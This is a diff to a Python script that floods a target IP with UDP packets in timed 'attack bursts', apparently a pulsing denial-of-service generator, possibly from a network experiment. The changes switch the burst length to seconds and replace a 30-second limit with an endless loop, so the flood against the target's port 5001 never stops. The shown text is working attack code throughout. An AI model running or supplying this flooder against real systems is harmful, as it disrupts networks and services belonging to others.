@@ -16,7 +16,7 @@ parser.add_argument('--length', '-l',
                     dest="length",
                     type=float,
                     action="store",
-                    help="Length of attack burst in ms",
+                    help="Length of attack burst in s",
                     required=True)
 parser.add_argument('--destIP', '-d',
                     dest="ip",
@@ -26,12 +26,11 @@ parser.add_argument('--destIP', '-d',
 args = parser.parse_args()
 
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
 MSG = '0' * 1000
 start = time()
 
-while time() - start < 30:
-    sleep(args.period)
+while True:
     now = time()
     while time() - now < args.length:
         s.sendto(MSG, (args.ip, 5001))
+    sleep(args.period)
